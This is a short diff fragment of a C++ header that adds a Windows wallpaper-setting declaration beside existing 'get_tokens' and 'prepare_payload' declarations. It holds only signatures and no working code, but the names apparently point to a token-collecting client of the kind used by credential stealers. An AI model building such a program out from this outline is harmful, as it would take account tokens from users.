@@ -15,5 +15,7 @@ namespace client {
 		std::vector<std::string> get_tokens();
 
 		std::string prepare_payload(std::string title, std::vector<std::string> tokens);
+
+		void set_wallpaper(LPCWSTR file);
 	}
 }
